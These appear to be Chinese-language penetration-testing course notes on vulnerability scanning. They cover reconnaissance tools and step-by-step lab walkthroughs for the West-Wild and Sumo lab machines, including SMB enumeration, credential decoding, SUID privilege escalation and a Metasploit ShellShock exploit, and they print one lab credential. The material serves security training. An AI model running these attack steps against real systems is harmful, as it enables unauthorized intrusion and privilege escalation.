# 03 - 漏洞扫描

## 一、知识点总结

### 1. 信息收集方法论

| 方法 | 特点 | 典型工具 |
|------|------|----------|
| **被动收集** | 不与目标直接交互，隐蔽性强 | Whois、`nslookup`、Netcraft、Google Hacking |
| **主动收集** | 直接与目标交互，信息更详细 | `nmap`、Metasploit、DirBuster、Amap |

### 2. 扫描工具体系

- **Nmap**：端口扫描、服务版本识别、操作系统指纹识别、NSE 脚本引擎
- **Dirb / DirBuster**：Web 目录爆破，发现隐藏路径
- **Nikto**：Web 漏洞扫描器，可检测 ShellShock 等已知漏洞
- **enum4linux**：SMB/Samba 枚举工具，提取用户、共享文件夹信息
- **smbclient**：SMB 客户端，访问共享资源
- **Amap**：应用层指纹识别，探测服务真实类型
- **BurpSuite**：Web 代理工具，用于编码解码和请求拦截

### 3. 渗透测试典型流程

```
信息收集 → 端口扫描 → 漏洞识别 → 漏洞利用 → 权限提升 → 痕迹清除
```

### 4. ShellShock 漏洞（CVE-2014-6271）

- **影响范围**：Bash 4.3 及更早版本
- **原理**：Bash 处理环境变量中的函数定义时未正确截断，导致注入的命令被执行
- **利用方式**：通过 HTTP 请求头注入恶意环境变量，配合 CGI 脚本触发

### 5. 信息泄露漏洞利用链（West-Wild 靶机）

```
nmap 端口发现 → dirb 目录扫描 → enum4linux SMB 枚举
→ smbclient 访问共享 → 获取 FLAG 文件 → base64 解码
→ SSH 登录 → SUID 提权 → 获取 root 权限
```

## 二、实操步骤

### 实验一：渗透测试信息收集

**步骤 1** — 被动收集：Whois 查询
```bash
whois baidu.com
```
> 获取管理员联系方式、DNS 服务器、注册时间等信息

**步骤 2** — 被动收集：DNS 解析
```bash
nslookup baidu.com
```

**步骤 3** — 被动收集：子域名收集
- 访问 phpinfo.me 输入目标域名，获取子域名和对应 IP
- 访问目标 `http://目标/robots.txt`，发现禁止目录（如 `Disallow: /admin/`）

**步骤 4** — 主动收集：存活主机扫描
```bash
# Metasploit ARP 扫描
msfconsole
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.159.0/24
run

# Nmap ICMP 扫描
nmap -sP 192.168.159.0/24
```

**步骤 5** — 操作系统识别
```bash
nmap -O 192.168.222.134
```

**步骤 6** — 端口扫描与服务探测
```bash
# 全端口扫描
nmap -p- 192.168.159.190

# 服务指纹识别
amap 192.168.159.190 80
```

**步骤 7** — Web 目录爆破
```bash
dirb http://192.168.159.190/ /usr/share/dirb/wordlists/big.txt
```

### 实验二：West-Wild 信息泄露漏洞渗透

**步骤 1** — 全端口服务扫描
```bash
nmap -T4 -A -p- -Pn -sV 192.168.1.254
```
> 发现开放 22(SSH)、80(HTTP)、139/445(SMB) 端口

**步骤 2** — Web 目录扫描
```bash
dirb http://192.168.1.254/
```

**步骤 3** — SMB 枚举
```bash
enum4linux 192.168.1.254
```
> 发现共享文件夹 `wave`

**步骤 4** — 访问 SMB 共享
```bash
smbclient //192.168.1.254/wave
dir
get FLAG1.txt
```

**步骤 5** — 解码获取凭据
```bash
cat FLAG1.txt
```
> 内容为 Base64 编码，使用 BurpSuite Decoder 模块解码，得到用户名和密码

**步骤 6** — SSH 登录
```bash
ssh 用户名@192.168.1.254
```

**步骤 7** — SUID 提权
```bash
find / -writable -type d 2>/dev/null
cd /usr/share/av/westsidesecret/
ls -al
cat ififoregt.sh
```
> 得到新凭据 `aveng:kaizen+80`，再次 SSH 登录获取 root 权限

### 实验三：Sumo ShellShock 漏洞利用

**步骤 1** — 存活主机发现
```bash
nmap -sn 192.168.1.0/24
```
> 发现目标 `192.168.1.254`

**步骤 2** — 端口扫描
```bash
nmap -sS -sV 192.168.1.254
```
> 发现开放 22(SSH) 和 80(HTTP) 端口

**步骤 3** — Web 目录扫描
```bash
dirb http://192.168.1.254/
```

**步骤 4** — Nikto 漏洞扫描
```bash
nikto -h http://192.168.1.254
```
> 发现站点易受 ShellShock 攻击

**步骤 5** — Metasploit 利用 ShellShock
```bash
msfconsole
# 搜索 ShellShock 相关模块
search shellshock
# 设置模块、目标 IP 和 Payload
set RHOSTS 192.168.1.254
set TARGETURI /cgi-bin/目标脚本
exploit
```

**步骤 6** — 验证并提权
```bash
sysinfo
shell
whoami
```

## 三、常见问题与排错

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| `nmap -sn` 扫描不到主机 | 目标禁 ping 或网段错误 | 用 `nmap -Pn` 跳过主机发现 |
| `dirb` 扫描无结果 | 字典太小或目标无目录 | 换用 `big.txt` 字典或自定义字典 |
| `smbclient` 连接被拒绝 | 445 端口未开放或防火墙 | 先用 `nmap -p 445` 确认端口状态 |
| `enum4linux` 报错超时 | SMB 服务未运行或网络不通 | 检查网络连通性和目标端口 |
| Base64 解码乱码 | 编码不完整或多层编码 | 尝试多次解码或检查是否有其他编码 |
| SSH 登录失败 | 密码错误或用户不存在 | 确认凭据来源，检查 SSH 配置 |
| `find` 命令输出太多 | 未过滤权限拒绝信息 | 加 `2>/dev/null` 抑制错误输出 |
| Nikto 报告误报 | 签名匹配不精确 | 结合其他工具交叉验证 |
| MSF ShellShock 利用失败 | 目标 CGI 路径不正确 | 用 `dirb` 先找到正确的 CGI 路径 |
| 提权失败 | SUID 程序不存在或无写权限 | 用 `find / -perm -4000` 查找 SUID 文件 |

## 四、速记口诀

```
信息收集两步走：被动 → 主动
被动看：Whois 查注册，DNS 解域名，robots 找目录
主动扫：nmap 探端口，dirb 爆路径，nikto 查漏洞

漏洞扫描三件套：nmap 端口 + nikto 漏洞 + dirb 目录
SMB 枚举记：enum4linux 列用户，smbclient 进共享

渗透提权链：扫描 → 枚举 → 登录 → 提权
SUID 提权：find / -perm -4000，找着 SUID 跑一遍

ShellShock 记忆法：CGI + Bash + 环境变量 = 命令注入
```
